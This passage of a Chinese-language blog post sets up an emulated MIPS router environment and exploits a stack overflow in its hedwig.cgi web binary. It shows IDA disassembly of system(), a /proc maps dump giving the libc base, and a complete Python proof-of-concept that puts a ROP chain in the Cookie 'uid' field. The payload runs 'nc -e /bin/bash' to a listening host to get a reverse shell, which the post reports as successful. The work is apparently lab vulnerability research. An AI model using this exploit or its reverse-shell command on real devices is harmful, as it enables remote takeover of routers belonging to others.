class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">.text:00053200                 .globl system  # weak</span><br><span class="line">.text:00053200 system:                                  # DATA XREF: LOAD:00003324↑o</span><br><span class="line">.text:00053200                                          # LOAD:00005084↑o</span><br><span class="line">.text:00053200</span><br><span class="line">.text:00053200 var_38          &#x3D; -0x38</span><br><span class="line">.text:00053200 var_30          &#x3D; -0x30</span><br><span class="line">.text:00053200 var_28          &#x3D; -0x28</span><br><span class="line">.text:00053200 var_1C          &#x3D; -0x1C</span><br><span class="line">.text:00053200 var_18          &#x3D; -0x18</span><br><span class="line">.text:00053200 var_14          &#x3D; -0x14</span><br><span class="line">.text:00053200 var_10          &#x3D; -0x10</span><br><span class="line">.text:00053200 var_C           &#x3D; -0xC</span><br><span class="line">.text:00053200 var_8           &#x3D; -8</span><br><span class="line">.text:00053200 var_4           &#x3D; -4</span><br><span class="line">.text:00053200</span><br><span class="line">.text:00053200                 la      $gp, loc_232E0   # Alternative name is &#39;__libc_system&#39;</span><br><span class="line">.text:00053208                 addu    $gp, $t9</span><br><span class="line">.text:0005320C                 addiu   $sp, -0x48</span><br><span class="line">.text:00053210                 sw      $ra, 0x48+var_4($sp)</span><br><span class="line">.text:00053214                 sw      $s5, 0x48+var_8($sp)</span><br><span class="line">.text:00053218                 sw      $s4, 0x48+var_C($sp)</span><br><span class="line">.text:0005321C                 sw      $s3, 0x48+var_10($sp)</span><br><span class="line">.text:00053220                 sw      $s2, 0x48+var_14($sp)</span><br><span class="line">.text:00053224                 sw      $s1, 0x48+var_18($sp)</span><br><span class="line">.text:00053228                 sw      $s0, 0x48+var_1C($sp)</span><br><span class="line">.text:0005322C                 sw      $gp, 0x48+var_30($sp)</span><br><span class="line">.text:00053230                 move    $s5, $a0</span><br><span class="line">.text:00053234                 beqz    $a0, loc_533C4</span><br><span class="line">.text:00053238                 li      $v0, 1</span><br><span class="line">.text:0005323C                 la      $s1, signal</span><br><span class="line">.text:00053240                 li      $a0, 3</span><br><span class="line">.text:00053244                 move    $t9, $s1</span><br><span class="line">.text:00053248                 jalr    $t9 ; signal</span><br><span class="line">.text:0005324C                 li      $a1, 1</span><br><span class="line">.text:00053250                 li      $a0, 2</span><br><span class="line">.text:00053254                 li      $a1, 1</span><br><span class="line">.text:00053258                 move    $t9, $s1</span><br><span class="line">.text:0005325C                 jalr    $t9 ; signal</span><br><span class="line">.text:00053260                 move    $s2, $v0</span><br><span class="line">.text:00053264                 li      $a0, 0x12</span><br><span class="line">.text:00053268                 move    $a1, $zero</span><br><span class="line">.text:0005326C                 move    $t9, $s1</span><br><span class="line">.text:00053270                 jalr    $t9 ; signal</span><br><span class="line">.text:00053274                 move    $s3, $v0</span><br><span class="line">.text:00053278                 lw      $gp, 0x48+var_30($sp)</span><br><span class="line">.text:0005327C                 la      $t9, fork</span><br><span class="line">.text:00053280                 jalr    $t9 ; fork</span><br><span class="line">.text:00053284                 move    $s4, $v0</span><br><span class="line">.text:00053288                 bgez    $v0, loc_532CC</span><br><span class="line">.text:0005328C                 move    $s0, $v0</span><br><span class="line">.text:00053290                 move    $a1, $s2</span><br><span class="line">.text:00053294                 move    $t9, $s1</span><br><span class="line">.text:00053298                 jalr    $t9 ; signal</span><br><span class="line">.text:0005329C                 li      $a0, 3</span><br><span class="line">.text:000532A0                 move    $a1, $s3</span><br><span class="line">.text:000532A4                 move    $t9, $s1</span><br><span class="line">.text:000532A8                 jalr    $t9 ; signal</span><br><span class="line">.text:000532AC                 li      $a0, 2</span><br><span class="line">.text:000532B0                 move    $a1, $s4</span><br><span class="line">.text:000532B4                 move    $t9, $s1</span><br><span class="line">.text:000532B8                 jalr    $t9 ; signal</span><br><span class="line">.text:000532BC                 li      $a0, 0x12</span><br><span class="line">.text:000532C0                 lw      $gp, 0x48+var_30($sp)</span><br><span class="line">.text:000532C4                 b       loc_533C4</span><br><span class="line">.text:000532C8                 li      $v0, 0xFFFFFFFF</span><br><span class="line">.text:000532CC  # ---------------------------------------------------------------------------</span><br><span class="line">.text:000532CC</span><br><span class="line">.text:000532CC loc_532CC:                               # CODE XREF: system+88↑j</span><br><span class="line">.text:000532CC                 bnez    $v0, loc_5333C</span><br><span class="line">.text:000532D0                 li      $a0, 3</span><br><span class="line">.text:000532D4                 move    $t9, $s1</span><br><span class="line">.text:000532D8                 jalr    $t9 ; signal</span><br><span class="line">.text:000532DC                 move    $a1, $zero</span><br><span class="line">.text:000532E0                 li      $a0, 2</span><br><span class="line">.text:000532E4                 move    $t9, $s1</span><br><span class="line">.text:000532E8                 jalr    $t9 ; signal</span><br><span class="line">.text:000532EC                 move    $a1, $zero</span><br><span class="line">.text:000532F0                 li      $a0, 0x12</span><br><span class="line">.text:000532F4                 move    $t9, $s1</span><br><span class="line">.text:000532F8                 jalr    $t9 ; signal</span><br><span class="line">.text:000532FC                 move    $a1, $zero</span><br><span class="line">.text:00053300                 lw      $gp, 0x48+var_30($sp)</span><br><span class="line">.text:00053304                 move    $a3, $s5</span><br><span class="line">.text:00053308                 li      $a0, 0x60000</span><br><span class="line">.text:0005330C                 li      $a1, 0x60000</span><br><span class="line">.text:00053310                 li      $a2, 0x60000</span><br><span class="line">.text:00053314                 la      $t9, execl</span><br><span class="line">.text:00053318                 addiu   $a0, (aBinSh - 0x60000)  # &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">.text:0005331C                 addiu   $a1, (off_5A450 - 0x60000)</span><br><span class="line">.text:00053320                 addiu   $a2, (off_5A454 - 0x60000)</span><br><span class="line">.text:00053324                 jalr    $t9 ; execl</span><br><span class="line">.text:00053328                 sw      $zero, 0x48+var_38($sp)</span><br><span class="line">.text:0005332C                 lw      $gp, 0x48+var_30($sp)</span><br><span class="line">.text:00053330                 la      $t9, _exit</span><br><span class="line">.text:00053334                 jalr    $t9 ; _exit</span><br><span class="line">.text:00053338                 li      $a0, 0x7F</span><br><span class="line">.text:0005333C</span><br><span class="line">.text:0005333C loc_5333C:                               # CODE XREF: system:loc_532CC↑j</span><br><span class="line">.text:0005333C                 move    $t9, $s1</span><br><span class="line">.text:00053340                 jalr    $t9 ; signal</span><br><span class="line">.text:00053344                 li      $a1, 1</span><br><span class="line">.text:00053348                 li      $a0, 2</span><br><span class="line">.text:0005334C                 move    $t9, $s1</span><br><span class="line">.text:00053350                 jalr    $t9 ; signal</span><br><span class="line">.text:00053354                 li      $a1, 1</span><br><span class="line">.text:00053358                 lw      $gp, 0x48+var_30($sp)</span><br><span class="line">.text:0005335C                 move    $a0, $s0</span><br><span class="line">.text:00053360                 la      $t9, wait4</span><br><span class="line">.text:00053364                 addiu   $a1, $sp, 0x48+var_28</span><br><span class="line">.text:00053368                 move    $a2, $zero</span><br><span class="line">.text:0005336C                 jalr    $t9 ; wait4</span><br><span class="line">.text:00053370                 move    $a3, $zero</span><br><span class="line">.text:00053374                 move    $v1, $v0</span><br><span class="line">.text:00053378                 li      $v0, 0xFFFFFFFF</span><br><span class="line">.text:0005337C                 bne     $v1, $v0, loc_53388</span><br><span class="line">.text:00053380                 lw      $gp, 0x48+var_30($sp)</span><br><span class="line">.text:00053384                 sw      $v1, 0x48+var_28($sp)</span><br><span class="line">.text:00053388</span><br><span class="line">.text:00053388 loc_53388:                               # CODE XREF: system+17C↑j</span><br><span class="line">.text:00053388                 la      $s0, signal</span><br><span class="line">.text:0005338C                 move    $a1, $s2</span><br><span class="line">.text:00053390                 move    $t9, $s0</span><br><span class="line">.text:00053394                 jalr    $t9 ; signal</span><br><span class="line">.text:00053398                 li      $a0, 3</span><br><span class="line">.text:0005339C                 move    $a1, $s3</span><br><span class="line">.text:000533A0                 move    $t9, $s0</span><br><span class="line">.text:000533A4                 jalr    $t9 ; signal</span><br><span class="line">.text:000533A8                 li      $a0, 2</span><br><span class="line">.text:000533AC                 move    $a1, $s4</span><br><span class="line">.text:000533B0                 move    $t9, $s0</span><br><span class="line">.text:000533B4                 jalr    $t9 ; signal</span><br><span class="line">.text:000533B8                 li      $a0, 0x12</span><br><span class="line">.text:000533BC                 lw      $gp, 0x48+var_30($sp)</span><br><span class="line">.text:000533C0                 lw      $v0, 0x48+var_28($sp)</span><br><span class="line">.text:000533C4</span><br><span class="line">.text:000533C4 loc_533C4:                               # CODE XREF: system+34↑j</span><br><span class="line">.text:000533C4                                          # system+C4↑j</span><br><span class="line">.text:000533C4                 lw      $ra, 0x48+var_4($sp)</span><br><span class="line">.text:000533C8                 lw      $s5, 0x48+var_8($sp)</span><br><span class="line">.text:000533CC                 lw      $s4, 0x48+var_C($sp)</span><br><span class="line">.text:000533D0                 lw      $s3, 0x48+var_10($sp)</span><br><span class="line">.text:000533D4                 lw      $s2, 0x48+var_14($sp)</span><br><span class="line">.text:000533D8                 lw      $s1, 0x48+var_18($sp)</span><br><span class="line">.text:000533DC                 lw      $s0, 0x48+var_1C($sp)</span><br><span class="line">.text:000533E0                 jr      $ra</span><br><span class="line">.text:000533E4                 addiu   $sp, 0x48</span><br><span class="line">.text:000533E4  # End of function system</span><br></pre></td></tr></table></figure>
<p>可以看到system以fork形式启动进程，并且当程序为子进程时跳转执行cmd：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00053280                 jalr    $t9 ; fork</span><br><span class="line">.text:00053284                 move    $s4, $v0</span><br><span class="line">.text:00053288                 bgez    $v0, loc_532CC</span><br><span class="line">loc_532CC-&gt;执行cmd</span><br></pre></td></tr></table></figure>
<p>应该是qemu user mode内部原因，只能将程序模拟运行，无法复现这里，所以选择在MIPS虚拟机模拟的Web服务中复现，首先拿到libc.so.0的映射地址，可以选择这种方式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;proc&#x2F;</span><br><span class="line">ls #确定下一个启动的程序的PID</span><br><span class="line">&#x2F;htdocs&#x2F;web&#x2F;hedwig.cgi &amp; cat  .&#x2F;PID&#x2F;maps  #a &amp; b-&gt;先执行a再执行b，无论a是否成功</span><br><span class="line">For example:</span><br><span class="line">root@debian-mipsel:&#x2F;proc# &#x2F;htdocs&#x2F;web&#x2F;hedwig.cgi&amp;cat .&#x2F;3688&#x2F;maps</span><br><span class="line">[1] 3688</span><br><span class="line">00400000-0041c000 r-xp 00000000 08:01 228956     &#x2F;htdocs&#x2F;cgibin</span><br><span class="line">0042c000-0042d000 rw-p 0001c000 08:01 228956     &#x2F;htdocs&#x2F;cgibin</span><br><span class="line">0042d000-0042f000 rwxp 00000000 00:00 0          [heap]</span><br><span class="line">2aaa8000-2aaad000 r-xp 00000000 08:01 547912     &#x2F;lib&#x2F;ld-uClibc-0.9.30.1.so</span><br><span class="line">2aaad000-2aaae000 rw-p 00000000 00:00 0 </span><br><span class="line">2aabc000-2aabd000 r--p 00004000 08:01 547912     &#x2F;lib&#x2F;ld-uClibc-0.9.30.1.so</span><br><span class="line">2aabd000-2aabe000 rw-p 00005000 08:01 547912     &#x2F;lib&#x2F;ld-uClibc-0.9.30.1.so</span><br><span class="line">2aabe000-2aae7000 r-xp 00000000 08:01 547913     &#x2F;lib&#x2F;libgcc_s.so.1</span><br><span class="line">2aae7000-2aaf7000 ---p 00000000 00:00 0 </span><br><span class="line">2aaf7000-2aaf8000 rw-p 00029000 08:01 547913     &#x2F;lib&#x2F;libgcc_s.so.1</span><br><span class="line">2aaf8000-2ab56000 r-xp 00000000 08:01 547915     &#x2F;lib&#x2F;libuClibc-0.9.30.1.so</span><br><span class="line">2ab56000-2ab65000 ---p 00000000 00:00 0 </span><br><span class="line">2ab65000-2ab66000 r--p 0005d000 08:01 547915     &#x2F;lib&#x2F;libuClibc-0.9.30.1.so</span><br><span class="line">2ab66000-2ab67000 rw-p 0005e000 08:01 547915     &#x2F;lib&#x2F;libuClibc-0.9.30.1.so</span><br><span class="line">2ab67000-2ab6c000 rw-p 00000000 00:00 0 </span><br><span class="line">7fd0a000-7fd1f000 rwxp 00000000 00:00 0          [stack]</span><br><span class="line">root@debian-mipsel:&#x2F;proc# HTTP&#x2F;1.1 200 OK</span><br><span class="line">Content-Type: text&#x2F;xml</span><br><span class="line"></span><br><span class="line">&lt;hedwig&gt;&lt;result&gt;FAILED&lt;&#x2F;result&gt;&lt;message&gt;no xml data.&lt;&#x2F;message&gt;&lt;&#x2F;hedwig&gt;</span><br></pre></td></tr></table></figure>
<p><strong>可以看到libc.so.0(链接：/lib/libuClibc-0.9.30.1.so)的加载基址为0x2aaf8000(正常路由环境和MIPS虚拟机中为了程序运行速度会取消canary，地址随机化等保护机制)</strong><br><strong>POC：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_payload</span><span class="params">(offset,libc_addr,cmd)</span>:</span></span><br><span class="line">    payload=<span class="string">"A"</span>*offset                     <span class="comment">#fill</span></span><br><span class="line">    payload+=p32(libc_addr+<span class="number">0x531ff</span>)        <span class="comment"># $s0</span></span><br><span class="line">    payload+=<span class="string">"A"</span>*<span class="number">4</span>                         <span class="comment"># $s1</span></span><br><span class="line">    payload+=<span class="string">"A"</span>*<span class="number">4</span>                         <span class="comment"># $s2</span></span><br><span class="line">    payload+=<span class="string">"A"</span>*<span class="number">4</span>                         <span class="comment"># $s3</span></span><br><span class="line">    payload+=<span class="string">"A"</span>*<span class="number">4</span>                         <span class="comment"># $s4</span></span><br><span class="line">    payload+=p32(libc_addr+<span class="number">0x159cc</span>)	   <span class="comment"># $s5 </span></span><br><span class="line">    payload+=<span class="string">"A"</span>*<span class="number">4</span>                         <span class="comment"># $s6 </span></span><br><span class="line">    payload+=<span class="string">"A"</span>*<span class="number">4</span>                         <span class="comment"># $s7</span></span><br><span class="line">    payload+=<span class="string">"A"</span>*<span class="number">4</span>                         <span class="comment"># $gp</span></span><br><span class="line">    payload+=p32(libc_addr+<span class="number">0x158c8</span>)        <span class="comment"># $ra</span></span><br><span class="line">    payload+=<span class="string">"A"</span>*<span class="number">16</span>                        <span class="comment">#fill</span></span><br><span class="line">    payload+=cmd           	           <span class="comment"># shellcode</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    cmd=<span class="string">"nc -e /bin/bash 192.168.160.131 1234"</span> <span class="comment">#填入本机IP&amp;&amp;监听端口(其他反弹shell命令总是不成功)</span></span><br><span class="line">    fake_cookie=<span class="string">"uid="</span>+get_payload(<span class="number">0x3cd</span>,<span class="number">0x2aaf8000</span>,cmd)</span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">'Cookie'</span>        : fake_cookie,</span><br><span class="line">        <span class="string">'Content-Type'</span>  : <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">        <span class="string">'Content-Length'</span>: <span class="string">'100'</span></span><br><span class="line">        &#125;</span><br><span class="line">    data = &#123;<span class="string">'uid'</span>:<span class="string">'kirin'</span>&#125;</span><br><span class="line">    ip_port=sys.argv[<span class="number">1</span>]  </span><br><span class="line">    url=<span class="string">"http://"</span>+ip_port+<span class="string">"/hedwig.cgi"</span></span><br><span class="line">    r=requests.post(url=url,headers=header,data=data)</span><br><span class="line">    log.info(<span class="string">"Kirin-say PWN"</span>)</span><br></pre></td></tr></table></figure>
<h2 id="Run-POC-amp-amp-反弹get-shell"><a href="#Run-POC-amp-amp-反弹get-shell" class="headerlink" title="Run POC&amp;&amp;反弹get shell"></a>Run POC&amp;&amp;反弹get shell</h2><p>MIPS虚拟机下开启路由器Web服务<br>在另一台虚拟机上:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python payload.py  mips_ip:port</span><br></pre></td></tr></table></figure>
<p><strong>Get shell Successfully：</strong><br><img src="https://upload-images.jianshu.io/upload_images/7434375-91d8bae3456a65af.gif?imageMogr2/auto-orient/strip" alt="PWNed"></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/CTF-Writeups/">CTF-Writeups</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Building-MIPS-Environment-for-Router-amp-amp-PWN"><span class="toc-number">1.</span> <span class="toc-text">Building MIPS Environment for Router &amp;&amp; PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Tools-for-preparation"><span class="toc-number">1.1.</span> <span class="toc-text">Tools for preparation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-Full-version-of-binwalk"><span class="toc-number">1.1.1.</span> <span class="toc-text">0x01 Full version of binwalk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-QEMU"><span class="toc-number">1.1.2.</span> <span class="toc-text">0x02 QEMU</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-libguestfs"><span class="toc-number">1.1.3.</span> <span class="toc-text">0x03 libguestfs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-MIPS-GCC"><span class="toc-number">1.1.4.</span> <span class="toc-text">0x04 MIPS-GCC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-gdb-amp-amp-gdbserver"><span class="toc-number">1.1.5.</span> <span class="toc-text">0x05 gdb&amp;&amp;gdbserver</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-Some-Tools-for-IDA"><span class="toc-number">1.1.6.</span> <span class="toc-text">0x06 Some Tools for IDA</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Retdec"><span class="toc-number">1.1.6.1.</span> <span class="toc-text">Retdec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MIPS-ROP-Finder"><span class="toc-number">1.1.6.2.</span> <span class="toc-text">MIPS ROP Finder</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Building-Environment-for-debug"><span class="toc-number">1.2.</span> <span class="toc-text">Building Environment for debug</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-Get-the-binary"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">0x01 Get the binary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-IDA静态分析"><span class="toc-number">1.2.0.2.</span> <span class="toc-text">0x02 IDA静态分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-Debug-Environment-with-QEMU-User-Mode"><span class="toc-number">1.2.0.3.</span> <span class="toc-text">0x03 Debug Environment with QEMU User Mode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-Web-Server-Build-with-QEMU-System-Mode"><span class="toc-number">1.2.0.4.</span> <span class="toc-text">0x04 Web Server Build with QEMU System Mode</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Debug-amp-amp-POC编写"><span class="toc-number">1.3.</span> <span class="toc-text">Debug &amp;&amp; POC编写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Run-POC-amp-amp-反弹get-shell"><span class="toc-number">1.4.</span> <span class="toc-text">Run POC&amp;&amp;反弹get shell</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/02/23/Building-MIPS-Environment-for-Router-PWN/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/02/23/Building-MIPS-Environment-for-Router-PWN/&text=Building MIPS Environment for Router &amp;&amp; PWN" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/02/23/Building-MIPS-Environment-for-Router-PWN/&title=Building MIPS Environment for Router &amp;&amp; PWN" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/02/23/Building-MIPS-Environment-for-Router-PWN/&is_video=false&description=Building MIPS Environment for Router &amp;&amp; PWN" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Building MIPS Environment for Router &amp;&amp; PWN&body=Check out this article: http://yoursite.com/2019/02/23/Building-MIPS-Environment-for-Router-PWN/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/02/23/Building-MIPS-Environment-for-Router-PWN/&title=Building MIPS Environment for Router &amp;&amp; PWN" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/02/23/Building-MIPS-Environment-for-Router-PWN/&title=Building MIPS Environment for Router &amp;&amp; PWN" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/02/23/Building-MIPS-Environment-for-Router-PWN/&title=Building MIPS Environment for Router &amp;&amp; PWN" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/02/23/Building-MIPS-Environment-for-Router-PWN/&title=Building MIPS Environment for Router &amp;&amp; PWN" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/02/23/Building-MIPS-Environment-for-Router-PWN/&name=Building MIPS Environment for Router &amp;&amp; PWN&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 Kirin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/CTF-Writeups/">CTF-Writeups</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
</body>
</html>
<!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


<!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


